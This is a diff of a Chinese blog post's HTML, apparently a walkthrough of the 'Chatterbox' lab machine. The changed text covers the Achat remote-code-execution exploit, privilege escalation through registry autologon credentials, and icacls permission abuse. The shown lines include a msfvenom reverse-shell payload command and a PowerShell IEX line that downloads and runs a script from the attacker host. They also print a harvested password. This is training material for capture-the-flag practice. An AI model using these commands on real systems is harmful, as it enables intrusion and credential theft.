@@ -50,15 +50,24 @@
 <meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.57.19.png">
 <meta property="og:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.58.29.png">
 <meta property="article:published_time" content="2022-01-26T02:47:33.000Z">
-<meta property="article:modified_time" content="2022-05-25T10:04:15.678Z">
+<meta property="article:modified_time" content="2022-07-14T01:07:27.734Z">
 <meta property="article:author" content="toxic80L">
-<meta property="article:tag" content="靶机">
 <meta property="article:tag" content="Windows">
-<meta property="article:tag" content="Achat">
+<meta property="article:tag" content="nmap">
+<meta property="article:tag" content="searchsploit">
+<meta property="article:tag" content="nishang">
+<meta property="article:tag" content="invoke-PowerShellTcp">
+<meta property="article:tag" content="PowerShell">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="Python">
 <meta property="article:tag" content="注册表">
-<meta property="article:tag" content="powershell">
-<meta property="article:tag" content="powerup">
-<meta property="article:tag" content="rce">
+<meta property="article:tag" content="用户凭证">
+<meta property="article:tag" content="Achat">
+<meta property="article:tag" content="PowerUp">
+<meta property="article:tag" content="icacls">
+<meta property="article:tag" content="plink">
+<meta property="article:tag" content="PowerSploit">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://toxic80l.github.io/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8A%E5%8D%889.52.52.png">
   
@@ -125,7 +134,7 @@
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.23.18.png" alt="截屏2021-10-18 下午4.23.18"><br>将利用脚本复制到当前目录</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/windows/remote/36025.py .</span><br></pre></td></tr></table></figure>
 <h4 id="修改利用脚本"><a href="#修改利用脚本" class="headerlink" title="修改利用脚本"></a>修改利用脚本</h4><p>查看脚本源码发现 exp 中通过 shellcode 完成反弹<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.26.18.png" alt="截屏2021-10-18 下午4.26.18"></p>
-<p>那么我们也根据示例使用 msfvenom 生成 shellcode</p>
+<p>根据示例使用 msfvenom 生成 shellcode</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=5555 -e x86/unicode_mixed -b <span class="string">&#x27;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#x27;</span> BufferRegister=EAX -f python</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.29.18.png" alt="截屏2021-10-18 下午4.29.18"></p>
 <p>生成的 shellcode 如下：</p>
@@ -138,19 +147,21 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 36025.py</span><br></pre></td></tr></table></figure>
 
 <p>成功拿到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.41.36.png" alt="截屏2021-10-18 下午4.41.36"></p>
-<p>在当前用户桌面上寻找第一个flag</p>
+<p>在当前用户桌面上寻找第一个flag，成功拿到第一个flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\Alfred\Desktop</span><br><span class="line"><span class="built_in">type</span> C:\Users\Alfred\Desktop\user.txt</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%885.02.47.png" alt="截屏2021-10-18 下午5.02.47"><br>成功拿到第一个flag</p>
-<h3 id="icacls读取flag"><a href="#icacls读取flag" class="headerlink" title="icacls读取flag"></a>icacls读取flag</h3><p>icacls 可以显示或修改指定文件上的自由访问控制列表（DACL），并将存储的 DACL 应用于指定目录中的文件。简单来说就是该应用嫩个够控制文件的权限。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%885.02.47.png" alt="截屏2021-10-18 下午5.02.47"></p>
+<h3 id="icacls读取flag"><a href="#icacls读取flag" class="headerlink" title="icacls读取flag"></a>icacls读取flag</h3><blockquote>
+<p>icacls 可以显示或修改指定文件上的自由访问控制列表（DACL），并将存储的 DACL 应用于指定目录中的文件。简单来说就是该应用嫩个够控制文件的权限。</p>
+</blockquote>
 <p>在当前权限下使用 icacls 查看管理员桌面，发现当前用户实际拥有控制权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls c:\Users\Administrator\Desktop</span><br></pre></td></tr></table></figure>
 
-<p>虽然对<code>root.txt</code>没有读取权限，但是使用 icacls 可为当前用户添加读取权限</p>
+<p>虽然对<code>root.txt</code>没有读取权限，但是使用 icacls 可为当前用户添加读取权限，最终成功拿到第二个flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line">icacls root.txt /grant alfred:F</span><br><span class="line">icacls root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.30.33.png" alt="截屏2021-10-18 下午11.30.33"><br>成功拿到第二个flag</p>
-<h2 id="0x03-权限提升-administrator"><a href="#0x03-权限提升-administrator" class="headerlink" title="0x03 权限提升[administrator]"></a>0x03 权限提升[administrator]</h2><h3 id="注册表获取凭证"><a href="#注册表获取凭证" class="headerlink" title="注册表获取凭证"></a>注册表获取凭证</h3><p>在注册表中发现用于自动登录的凭证密码：<code>Welcome1!</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.30.33.png" alt="截屏2021-10-18 下午11.30.33"></p>
+<h2 id="0x03-权限提升-administrator"><a href="#0x03-权限提升-administrator" class="headerlink" title="0x03 权限提升[administrator]"></a>0x03 权限提升[administrator]</h2><h3 id="注册表获取凭证"><a href="#注册表获取凭证" class="headerlink" title="注册表获取凭证"></a>注册表获取凭证</h3><p>在注册表中发现用于自动登录的凭证密码：<code>Welcome1!</code>，考虑到管理员可能会将该密码重用，尝试使用该凭证登陆管理员账户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> 2&gt;nul | findstr <span class="string">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.46.06.png" alt="截屏2021-10-18 下午4.46.06"><br>考虑到管理员可能会将该密码重用，我们需要使用该凭证登陆管理员账户</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.46.06.png" alt="截屏2021-10-18 下午4.46.06"></p>
 <h3 id="ssh反向连接"><a href="#ssh反向连接" class="headerlink" title="ssh反向连接"></a>ssh反向连接</h3><p>首先将端口转发工具 plink.exe 上传至靶机</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/windows-resources/binaries/plink.exe .</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.49.30.png" alt="截屏2021-10-18 下午4.49.30"></p>
@@ -160,9 +171,9 @@
 <p>在 kali 中开启 ssh 服务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br><span class="line">service ssh status</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%884.55.28.png" alt="截屏2021-10-18 下午4.55.28"></p>
-<p>在靶机上通过 plink.exe 完成ssh端口转发</p>
+<p>在靶机上通过 plink.exe 完成ssh端口转发，但是无法连接，尝试使用登陆凭证提权</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw root  -R 445:127.0.0.1:445 10.10.14.3</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.36.20.png" alt="截屏2021-10-18 下午11.36.20"><br>但是经过尝试后无法连接，我们可尝试使用登陆凭证提权</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-18%20%E4%B8%8B%E5%8D%8811.36.20.png" alt="截屏2021-10-18 下午11.36.20"></p>
 <h3 id="登陆凭证提权"><a href="#登陆凭证提权" class="headerlink" title="登陆凭证提权"></a>登陆凭证提权</h3><p>由于当前命令行环境为 cmd，为了获取 powershell 环境，我们可使用 nishang 中的 Invoke-PowerShellTcp.ps1 脚本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . </span><br></pre></td></tr></table></figure>
 
@@ -194,11 +205,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -FilePath <span class="string">&quot;powershell&quot;</span> -argumentlist <span class="string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27; http://10.10.14.3/shell.ps1&#x27; )&quot;</span> -Credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.56.43.png" alt="截屏2021-10-19 上午12.56.43"></p>
 <p>成功拿到管理员权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.57.19.png" alt="截屏2021-10-19 上午12.57.19"></p>
-<p>在管理员桌面寻找第二个flag</p>
+<p>在管理员桌面寻找第二个flag，成功获取第二个flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.58.29.png" alt="截屏2021-10-19 上午12.58.29"><br>成功获取第二个flag</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过端口扫描发现靶机中存在Achat系统，利用Achat系统的远程代码执行漏洞，我们成功拿到了用户权限。由于靶机对文件权限未配置得当，因此我们可以使用icacls来为当前用户添加读取权限，从而成功读取root.txt。</p>
-<p>使用 powerup 脚本能对服务器相关安全配置进行检查，发现在注册表中存在管理员自动登陆凭证，我们可在powershell环境下利用该凭证上线管理员，最终成功拿到靶机的管理员权限。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/28ba001e/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8812.58.29.png" alt="截屏2021-10-19 上午12.58.29"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>Chatterbox译为话匣子，靶机确实与聊天息息相关。它的突破口就是 Achat 聊天系统，利用该系统的远程执行漏洞可成功获取用户权限，由于服务器的文件权限配置不当，使用 icacls 命令可为当前用户添加读取权限，从而能够直接读取 root.txt，如果想要完成权限提升，使用 PowerUp 可检查服务器相关的安全配置，检查结果显示注册表中存在管理员自动登录凭证，通过该密码可成功获取管理员权限。</p>
 
 
 <div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
